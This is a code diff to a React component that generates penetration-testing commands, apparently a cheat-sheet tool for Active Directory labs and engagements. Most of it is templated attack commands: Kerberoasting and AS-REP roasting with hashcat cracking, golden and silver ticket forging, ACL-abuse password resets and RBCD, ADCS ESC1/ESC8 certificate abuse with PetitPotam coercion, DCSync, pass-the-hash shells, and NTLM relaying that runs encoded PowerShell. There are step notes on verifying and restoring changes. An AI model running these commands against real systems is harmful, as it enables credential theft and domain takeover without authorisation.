@@ -262,7 +262,7 @@ export default function CommandCalculator() {
         { phase: "First-touch nmap", cmds: [
           { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 5000 -T4 -Pn ${IP} -oN allports.txt` },
           { label: "Extract open ports → $PORTS", cmd: `grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,\n# Capture into a var to feed the next scan:\nPORTS=$(grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,)`, note: "Output like 21,80,135,139,443,445 — feeds straight into -p below." },
-          { label: "Targeted -sCV on open ports", cmd: `sudo nmap -sC -sV -p $PORTS ${IP} -oN targeted.txt`, note: "Run after the line above sets $PORTS — no hand-typing ports." },
+          { label: "Targeted -sCV on open ports", cmd: `echo "$PORTS"          # VERIFY non-empty before relying on it\nsudo nmap -sC -sV -p $PORTS ${IP} -oN targeted.txt`, note: "Empty $PORTS scans nothing and still looks like a clean result — echo it first." },
           { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 -Pn ${IP} -oN udp.txt` },
         ]},
         { phase: "Subnet → live hosts (greppable)", cmds: [
@@ -362,19 +362,74 @@ export default function CommandCalculator() {
     },
     kerberos: {
       name: "Kerberos", groups: [
-        { phase: "Tickets", cmds: [
-          { label: "Request TGT", cmd: authMode === "hash"
-            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
-            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
-          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
-          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
+        { phase: "0 — Setup (do this first)", cmds: [
+          { label: "0.1  Map the DC in /etc/hosts", cmd: `echo "${DCIP} ${HOST}.${D} ${HOST} ${D}" | sudo tee -a /etc/hosts`, note: "Kerberos matches on hostname, never IP. Every later step breaks without this." },
+          { label: "0.2  Check clock drift vs the DC", cmd: `ntpdate -q ${DCIP}`, note: ">5 min off the KDC = every ticket request fails. 10 seconds here saves an hour." },
+          { label: "0.3  Fix skew — faketime (preferred)", cmd: `export FT="$(ntpdate -q ${DCIP} | awk '{print $1" "$2}')"\necho $FT`, note: "Set once, reuse as: faketime \"$FT\" <command>. Leaves your system clock and TLS alone." },
+          { label: "0.3b Fix skew — sync host clock", cmd: `sudo timedatectl set-ntp 0\nsudo ntpdate -u ${DCIP}\ntimedatectl status`, note: "set-ntp 0 FIRST or timesyncd undoes it in seconds. Restore later with set-ntp 1." },
+        ]},
+        { phase: "1 — Find targets (no tickets requested yet)", cmds: [
+          { label: "1.1  List SPN accounts (no -request)", cmd: authMode === "krb"
+            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U}`
+            : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Enumeration only — runs over LDAP, no Kerberos, so it works even with bad clock skew. Read the Delegation column." },
+          { label: "1.2  SPN accounts → kerb_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee kerb_users.txt` },
+          { label: "1.3  AS-REP accounts → asrep_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee asrep_users.txt`, note: "DONT_REQ_PREAUTH accounts — roastable with no credentials at all." },
+          { label: "1.4  Machine accounts are NOT worth roasting", cmd: `# Skip any SPN owned by a name ending in $ — those are 120-char\n# random machine passwords. Only human-set service accounts crack.`, note: "Reading, not running. Saves you cracking a hash that will never fall." },
+        ]},
+        { phase: "2 — Request the hashes", cmds: [
+          { label: "2.1  Kerberoast — all SPNs", cmd: authMode === "krb"
+            ? `faketime "$FT" impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
+            : `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt`, note: "$FT comes from step 0.3. Drop the faketime prefix if your clock is already synced." },
+          { label: "2.2  Kerberoast — one account", cmd: `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request-user sql_svc -outputfile tgs_sqlsvc.txt`, note: "Quieter, and lets you retry a single account without re-requesting everything." },
+          { label: "2.3  Kerberoast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt`, note: "Writes straight to file. Handy if impacket is misbehaving." },
+          { label: "2.4  AS-REP roast — from userlist", cmd: `faketime "$FT" impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile asrep_users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat or it writes john format and -m 18200 rejects it." },
+          { label: "2.5  AS-REP roast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
+        ]},
+        { phase: "3 — VERIFY you got hashes", cmds: [
+          { label: "3.1  Did the file get written?", cmd: `ls -l tgs.txt asrep.txt 2>/dev/null`, note: "THE step people skip. A clean-looking SPN table with no file means the ticket request failed — go back to step 0.2." },
+          { label: "3.2  Count the hashes", cmd: `grep -c 'krb5tgs' tgs.txt\ngrep -c 'krb5asrep' asrep.txt`, note: "Zero here means enumeration worked and roasting didn't. Not the same thing." },
+          { label: "3.3  Check the encryption type", cmd: `cut -d'$' -f2,3 tgs.txt | sort -u`, note: "23 = RC4 -> hashcat -m 13100. 18 = AES256 -> -m 19700. Wrong mode looks like 'no hashes loaded'." },
+        ]},
+        { phase: "4 — Crack", cmds: [
+          { label: "4.1  Kerberoast — straight rockyou", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Try this bare first. Service accounts set years ago fall in seconds." },
+          { label: "4.2  Kerberoast — with rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "Rules missing? find / -name 'best64.rule' 2>/dev/null — otherwise: apt install --reinstall hashcat" },
+          { label: "4.3  AS-REP crack", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` },
+          { label: "4.4  AES-encrypted TGS (etype 18)", cmd: `hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Only if step 3.3 showed 18. Much slower than RC4 — expect it." },
+          { label: "4.5  Show what cracked", cmd: `hashcat -m 13100 tgs.txt --show | awk -F: '{print $NF}'\nhashcat -m 13100 tgs.txt --show | sed 's/.*\\*\\([^$]*\\)\\$.*:/\\1:/'`, note: "Recovers results from the potfile without re-running the attack." },
+        ]},
+        { phase: "5 — Use the credential (do NOT skip)", cmds: [
+          { label: "5.1  Every service, every host", cmd: `for svc in smb winrm mssql rdp ssh; do\n  echo "=== $svc ==="\n  nxc $svc ${IP} -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} 2>/dev/null | grep -F '[+]'\ndone`, note: "The single highest-value step in this whole list. Do it before any further technique." },
+          { label: "5.2  Try for an interactive shell", cmd: `evil-winrm -i ${HOST}.${D} -u <CRACKED_USER> -p '<CRACKED_PASS>'\nimpacket-mssqlclient ${D}/<CRACKED_USER>:'<CRACKED_PASS>'@${IP} -windows-auth`, note: "No (Pwn3d!) does NOT mean no access — WinRM and MSSQL rights are invisible to that check." },
+          { label: "5.3  Spray it at every account", cmd: `nxc smb ${SUBNET} -u users.txt -p '<CRACKED_PASS>' --continue-on-success | grep -F '[+]'`, note: "Admins reuse service account passwords constantly." },
+          { label: "5.4  Re-run BloodHound as the new user", cmd: `bloodhound-python -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} -ns ${DCIP} -c All --zip`, note: "New identity can see graph edges the old one couldn't." },
+        ]},
+        { phase: "6 — If it won't crack", cmds: [
+          { label: "6.1  Bigger wordlist / heavier rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`, note: "Long shot on a laptop CPU. Time-box it and keep enumerating in parallel." },
+          { label: "6.2  Silver ticket — no cracking needed", cmd: `impacket-ticketer -nthash <NTHASH_OF_SVC_ACCT> -domain-sid <DOMAIN_SID> -domain ${D} -spn <SERVICE>/<HOST>.${D} Administrator\nexport KRB5CCNAME=$PWD/Administrator.ccache`, note: "Only works for the service that account OWNS. WinRM and CIFS belong to the MACHINE account, not a user — check who holds the SPN first." },
+          { label: "6.3  Check delegation on the SPN account", cmd: `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} | awk '{print $NF}'`, note: "An unconstrained/constrained delegation flag is a bigger win than the password." },
+          { label: "6.4  Move on", cmd: `# Uncrackable service account is a dead end, not a puzzle.\n# Go back to BloodHound ACLs, shares, and the web app.`, note: "Reading, not running. Roasting is one branch, not the path." },
+        ]},
+        { phase: "7 — Error decoder", cmds: [
+          { label: "KRB_AP_ERR_SKEW", cmd: `ntpdate -q ${DCIP}`, note: "Clock skew. Back to step 0.2/0.3." },
+          { label: "CCache file is not found. Skipping...", cmd: `# Harmless. Impacket checks for KRB5CCNAME, finds none,\n# falls back to your password. Not an error.`, note: "Reading, not running. Everyone panics at this line once." },
+          { label: "No hashes, no outputfile, clean SPN table", cmd: `ls -l tgs.txt`, note: "Enumeration is LDAP, roasting is Kerberos. The table succeeding proves nothing about the request." },
+          { label: "KDC_ERR_ETYPE_NOTSUPP", cmd: `cat /etc/krb5.conf | grep -i enctype`, note: "RC4 disabled on the DC or on your client. Add rc4-hmac to permitted_enctypes, or roast for AES and use -m 19700." },
+          { label: "hashcat: No hashes loaded", cmd: `head -c 60 tgs.txt\ncut -d'$' -f2,3 tgs.txt | sort -u`, note: "Wrong -m for the etype, or the file holds john format instead of hashcat format." },
         ]},
         { phase: "Rubeus (on a Windows foothold)", cmds: [
           { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
+          { label: "Kerberoast — stats only", cmd: `.\\Rubeus.exe kerberoast /stats`, note: "Shows how many roastable accounts exist and their password-set dates. Old dates crack." },
           { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
           { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
           { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
           { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
+        ]},
+        { phase: "Other tickets", cmds: [
+          { label: "Request TGT", cmd: authMode === "hash"
+            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
+            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
+          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=$PWD/${U}.ccache\nklist\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}`, note: "Use an ABSOLUTE path — a relative KRB5CCNAME breaks the moment you cd." },
+          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
         ]},
       ],
     },
@@ -402,49 +457,113 @@ export default function CommandCalculator() {
     },
     aclabuse: {
       name: "ACL Abuse", groups: [
-        { phase: "Find the edge", cmds: [
-          { label: "What can I abuse? (BloodHound)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip`, note: "Mark yourself Owned, run 'Shortest paths from Owned principals'." },
-          { label: "ACLs on a target object", cmd: `Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (ConvertTo-SID ${Q}${U}${Q}) }`, note: "Look for GenericAll / GenericWrite / WriteDacl / ForceChangePassword." },
+        { phase: "1 — Find the edge", cmds: [
+          { label: "1.1  BloodHound — shortest path", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip`, note: "Mark yourself Owned, run 'Shortest paths from Owned principals'. The edge type decides which phase below you use." },
+          { label: "1.2  ACLs on a specific target", cmd: `Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (ConvertTo-SID ${Q}${U}${Q}) }`, note: "Look for GenericAll / GenericWrite / WriteDacl / ForceChangePassword / AddMember." },
+          { label: "1.3  Every ACL edge in the domain (Linux)", cmd: `nxc ldap ${IP} ${nxcA()} --bloodhound --collection All -ns ${DCIP}`, note: "No Windows foothold needed — collect from Kali and read the graph." },
         ]},
-        { phase: "ForceChangePassword / GenericAll on a user", cmds: [
-          { label: "Reset the target's password", cmd: `net rpc password TARGETUSER 'NewPass123!' -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Loud (changes a real password). In labs fine; note it for the report." },
-          { label: "PowerView variant", cmd: `$p=ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword $p` },
+        { phase: "2A — GenericWrite on a user (SAFEST — no reset)", cmds: [
+          { label: "2A.1  Targeted kerberoast", cmd: `targetedKerberoast.py -v -d ${D} -u ${U} -p ${Q}${SEC}${Q} --request-user TARGETUSER`, note: "Adds a temp SPN, roasts, removes it. Changes nothing permanent — always prefer this over a password reset." },
+          { label: "2A.2  Crack the returned hash", cmd: `hashcat -m 13100 targeted_tgs.txt /usr/share/wordlists/rockyou.txt` },
         ]},
-        { phase: "GenericWrite on a user → targeted roast", cmds: [
-          { label: "Add an SPN, then kerberoast", cmd: `targetedKerberoast.py -v -d ${D} -u ${U} -p ${Q}${SEC}${Q} --request-user TARGETUSER`, note: "Sets a temporary SPN, roasts, removes it — no password reset needed." },
+        { phase: "2B — ForceChangePassword / GenericAll on a user", cmds: [
+          { label: "2B.1  RECORD the current state first", cmd: `# You are about to overwrite a real password. Note the target\n# so you can flag it in your report — you cannot restore the old one.`, note: "Reading, not running. Password reset is destructive and irreversible — know that before you do it." },
+          { label: "2B.2  Reset the password", cmd: `net rpc password TARGETUSER 'NewPass123!' -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Loud and permanent. Fine in labs; document it on a real engagement." },
+          { label: "2B.3  PowerView variant", cmd: `$p=ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword $p` },
         ]},
-        { phase: "GenericAll on a group / RBCD", cmds: [
-          { label: "Add yourself to a group", cmd: `net rpc group addmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Then re-auth to pick up the new membership." },
-          { label: "RBCD (GenericWrite on a computer)", cmd: `impacket-rbcd -delegate-to TARGET\\$ -delegate-from ${U} -action write ${Q}${D}/${U}:${SEC}${Q}`, note: "Then getST -impersonate Administrator for the target host." },
+        { phase: "2C — GenericAll on a group", cmds: [
+          { label: "2C.1  Add yourself to the group", cmd: `net rpc group addmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}` },
+          { label: "2C.2  Re-auth to pick up membership", cmd: `# Group membership is baked into your ticket at logon.\n# Get a fresh TGT or reconnect — the old ticket won't have it.`, note: "Reading, not running. This is why 'I added myself but still can't' happens." },
+        ]},
+        { phase: "2D — GenericWrite on a computer (RBCD)", cmds: [
+          { label: "2D.1  Write the delegation", cmd: `impacket-rbcd -delegate-to 'TARGET$' -delegate-from ${U} -action write ${Q}${D}/${U}:${SEC}${Q}` },
+          { label: "2D.2  Get an impersonated ST", cmd: `impacket-getST -spn cifs/TARGET.${D} -impersonate Administrator -dc-ip ${DCIP} ${Q}${D}/${U}:${SEC}${Q}` },
+        ]},
+        { phase: "3 — VERIFY it worked", cmds: [
+          { label: "3.1  Password reset → test the login", cmd: `nxc smb ${IP} -u TARGETUSER -p 'NewPass123!' -d ${D}`, note: "[+] confirms the reset. STATUS_LOGON_FAILURE means the reset silently failed — check your ACL edge again." },
+          { label: "3.2  Group add → confirm membership", cmd: `nxc ldap ${IP} ${nxcA()} --query "(sAMAccountName=${U})" "memberOf"`, note: "The target group should now appear. If not, the addmem was rejected." },
+          { label: "3.3  RBCD → check the attribute took", cmd: `impacket-rbcd -delegate-to 'TARGET$' -action read ${Q}${D}/${U}:${SEC}${Q}`, note: "Lists who can delegate. Your account should be there before you try getST." },
+        ]},
+        { phase: "4 — Use the new access", cmds: [
+          { label: "4.1  Reset path → shell as the target", cmd: `evil-winrm -i ${HOST}.${D} -u TARGETUSER -p 'NewPass123!'` },
+          { label: "4.2  RBCD path → use the ST", cmd: `export KRB5CCNAME=$PWD/Administrator@cifs_TARGET.${D}.ccache\nimpacket-psexec -k -no-pass ${D}/Administrator@TARGET.${D}` },
+        ]},
+        { phase: "5 — RESTORE (real engagements)", cmds: [
+          { label: "5.1  Remove yourself from the group", cmd: `net rpc group delmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Undo AddMember when you're done. Leave the environment as you found it." },
+          { label: "5.2  Remove RBCD delegation", cmd: `impacket-rbcd -delegate-to 'TARGET$' -delegate-from ${U} -action remove ${Q}${D}/${U}:${SEC}${Q}` },
+          { label: "5.3  Password reset — cannot be undone", cmd: `# The original password is gone. Flag the account in your report\n# so the owner can be told to reset it. There is no rollback.`, note: "Reading, not running. This is exactly why 2A (targeted roast) is the preferred path when you have the choice." },
         ]},
       ],
     },
     adcs: {
       name: "ADCS / Certipy", groups: [
-        { phase: "Find vulnerable templates", cmds: [
-          { label: "certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1-16. Start here." },
-          { label: "certipy find (full, hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -stdout` },
-          { label: "nxc ADCS module", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs` },
+        { phase: "0 — Setup", cmds: [
+          { label: "0.1  Map the DC + CA in /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Certipy's auth step is Kerberos-backed — hostname must resolve or PKINIT fails." },
+          { label: "0.2  Check clock skew (bites the auth step)", cmd: `ntpdate -q ${DCIP}`, note: "certipy req can succeed while certipy auth dies on KRB_AP_ERR_SKEW. Fix now. See the Kerberos tab step 0.3." },
         ]},
-        { phase: "ESC1 — request as anyone", cmds: [
-          { label: "Request cert w/ alt SID (DA)", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "Get CA-NAME + template from 'certipy find'. On patched DCs (May 2022) add -sid <target SID> for the SID extension." },
-          { label: "Auth with the cert → hash/TGT", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns the NT hash + a TGT for Administrator." },
+        { phase: "1 — Find vulnerable templates", cmds: [
+          { label: "1.1  certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1–16. Note the CA name and template name — every later step needs both." },
+          { label: "1.2  certipy find (with a hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -vulnerable -stdout` },
+          { label: "1.3  nxc ADCS module (quick check)", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs`, note: "Fast yes/no on whether a CA even exists before you dig in." },
         ]},
-        { phase: "ESC8 — relay to web enroll", cmds: [
-          { label: "Relay to CA enrollment", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Pair with a coerce (PetitPotam/Coercer) to capture the DC$ cert." },
-          { label: "Coerce the DC", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}` },
+        { phase: "2 — ESC1: request a cert as anyone", cmds: [
+          { label: "2.1  Request as Administrator", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "CA-NAME and VULN-TEMPLATE come from step 1.1. On DCs patched post-May-2022 also add: -sid <administrator's SID>." },
+          { label: "2.2  (patched DCs) get the target SID first", cmd: `impacket-lookupsid ${Q}${D}/${U}:${SEC}${Q}@${DCIP} | grep -i administrator`, note: "Feed the 500 SID into -sid on the req above when the CA enforces the SID extension." },
         ]},
-        { phase: "Use the result", cmds: [
-          { label: "Pass-the-cert / DCSync", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "Use the NT hash certipy auth returned." },
+        { phase: "3 — VERIFY the cert is usable", cmds: [
+          { label: "3.1  Did the .pfx get written?", cmd: `ls -l administrator.pfx`, note: "No file = the request was denied (perms, wrong template, or CA offline). Re-read the find output." },
+          { label: "3.2  Inspect the UPN inside it", cmd: `certipy cert -pfx administrator.pfx -nokey\ncertipy cert -pfx administrator.pfx -nocert 2>/dev/null | head`, note: "The UPN in the cert must be administrator@domain. If it's YOUR name, the -upn didn't take and auth will fail." },
+        ]},
+        { phase: "4 — Authenticate → hash + TGT", cmds: [
+          { label: "4.1  certipy auth", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns Administrator's NT hash AND a .ccache TGT. Wrap in faketime if step 0.2 showed drift." },
+          { label: "4.2  Load the TGT", cmd: `export KRB5CCNAME=$PWD/administrator.ccache\nklist`, note: "Absolute path — a relative KRB5CCNAME breaks the moment you cd." },
+        ]},
+        { phase: "5 — Use the result", cmds: [
+          { label: "5.1  DCSync with the recovered hash", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "RECOVERED_HASH is the NT hash from step 4.1." },
+          { label: "5.2  Or shell straight in", cmd: `evil-winrm -i ${HOST}.${D} -u administrator -H RECOVERED_HASH`, note: "Pass-the-hash to a shell — no cracking, the cert gave you the hash directly." },
+        ]},
+        { phase: "6 — ESC8 (relay to web enroll)", cmds: [
+          { label: "6.1  Start the relay", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Leave running. It captures a cert for whatever machine account you coerce." },
+          { label: "6.2  Coerce the DC to authenticate", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}`, note: "Forces DC$ to auth to your relay. relayx prints a base64 cert for DC$ → certipy auth that for a DC TGT." },
+        ]},
+        { phase: "7 — Error decoder", cmds: [
+          { label: "KRB_AP_ERR_SKEW on certipy auth", cmd: `ntpdate -q ${DCIP}`, note: "Classic: req works (LDAP/HTTP), auth fails (Kerberos). Fix the clock, retry just the auth step." },
+          { label: "req: certificate request denied", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Your account can't enroll on that template, or you typed the CA/template wrong. Re-read find." },
+          { label: "auth: KDC_ERR_PADATA_TYPE_NOSUPP", cmd: `# The DC lacks a KDC certificate — PKINIT isn't available.\n# Fall back to the -ldap-shell that certipy auth offers, or ESC8.`, note: "Not every ESC path ends in a hash. This DC can't do cert logon; pivot to relay." },
+          { label: "auth: object SID mismatch", cmd: `# Post-May-2022 patch: the cert needs the target's SID.\n# Re-request with -sid <administrator SID> (step 2.2).`, note: "The single most common ESC1 failure on current patch levels." },
         ]},
       ],
     },
     relay: {
       name: "Relay / Poison", groups: [
-        { phase: "Capture & relay", cmds: [
-          { label: "responder", cmd: `sudo responder -I tun0 -wv`, note: "Add -A first to analyze-only (passive); drop -A to actively poison." },
-          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
-          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}` },
+        { phase: "0 — Setup (relay fails silently without this)", cmds: [
+          { label: "0.1  Find targets with SMB signing OFF", cmd: `nxc smb ${SUBNET} --gen-relay-list targets.txt\ncat targets.txt`, note: "You can ONLY relay to hosts where signing is not required. This writes exactly those." },
+          { label: "0.2  Disable SMB + HTTP in Responder", cmd: `sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\ngrep -E '^(SMB|HTTP)' /etc/responder/Responder.conf`, note: "ntlmrelayx needs those ports. If Responder holds them, the relay never receives the auth. THE step people miss." },
+          { label: "0.3  Confirm your listen interface", cmd: `ip -br a | grep -E 'tun0|eth0'`, note: "Lab VPN is usually tun0. Poisoning the wrong interface captures nothing." },
+        ]},
+        { phase: "1 — Passive first (see before you poison)", cmds: [
+          { label: "1.1  Analyze-only", cmd: `sudo responder -I tun0 -A`, note: "-A watches without answering. Tells you who's broadcasting for names before you inject." },
+        ]},
+        { phase: "2 — Relay", cmds: [
+          { label: "2.1  ntlmrelayx → SMB (dump SAM)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support`, note: "Default action dumps SAM on any relayed host where the victim is local admin." },
+          { label: "2.2  ntlmrelayx → exec a command", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -c 'powershell -enc <B64>'` },
+          { label: "2.3  ntlmrelayx → SOCKS (hold the session)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`, note: "Keeps relayed sessions open in a socks list — use them later through proxychains." },
+          { label: "2.4  Poison (only after passive looks right)", cmd: `sudo responder -I tun0 -wv`, note: "Now actively answers LLMNR/NBT-NS. Run this in a second pane; relayx catches what it coerces." },
+          { label: "2.5  Or coerce a specific host", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}`, note: "Deterministic — forces one host to auth to you instead of waiting for a mistyped path." },
+        ]},
+        { phase: "3 — VERIFY the relay landed", cmds: [
+          { label: "3.1  Watch for the success line", cmd: `# In the relayx window, look for:\n#   [*] Authenticating against smb://... SUCCEED\n#   [*] Dumping local SAM hashes\n# Hashes scrolling in Responder ≠ a successful relay.`, note: "Responder capturing a Net-NTLMv2 hash and relayx completing a relay are DIFFERENT events. Confirm the relayx line." },
+          { label: "3.2  If SOCKS mode — list live sessions", cmd: `# type in the relayx prompt:\nsocks`, note: "Empty list = nothing relayed yet, keep coercing. Populated = pivot with proxychains." },
+        ]},
+        { phase: "4 — Use it", cmds: [
+          { label: "4.1  Crack a captured Net-NTLMv2 (if no relay target)", cmd: `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`, note: "When signing is ON everywhere you can't relay — fall back to cracking what Responder caught." },
+          { label: "4.2  Use a SOCKS session", cmd: `proxychains -q nxc smb 127.0.0.1 -u <relayed_user> --local-auth`, note: "Drive the held session through proxychains for further action." },
+        ]},
+        { phase: "5 — Error decoder", cmds: [
+          { label: "Relay connects but nothing dumps", cmd: `grep -E '^(SMB|HTTP)' /etc/responder/Responder.conf`, note: "Both must read Off. Responder squatting on 445/80 is the #1 cause of a silent relay." },
+          { label: "All targets rejected", cmd: `nxc smb ${SUBNET} | grep -i 'signing:True'`, note: "Signing required everywhere = relay impossible. Switch to cracking (step 4.1) or coercion elsewhere." },
+          { label: "STATUS_ACCESS_DENIED on relay", cmd: `# The relayed user isn't admin on the target.\n# Relay to a DIFFERENT host where they are, or use -socks to hold it.`, note: "A valid relay to a box the user can't admin still gets you nothing. Aim it where they have rights." },
+          { label: "Responder silent (no events)", cmd: `ip -br a | grep tun0`, note: "Wrong -I interface. Poisoning eth0 on a tun0 VPN sees no lab traffic." },
         ]},
       ],
     },
@@ -478,25 +597,34 @@ export default function CommandCalculator() {
     },
     webdav: {
       name: "WebDAV", groups: [
-        { phase: "Detect", cmds: [
-          { label: "nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
-          { label: "OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
-          { label: "Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
+        { phase: "1 — Detect", cmds: [
+          { label: "1.1  nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
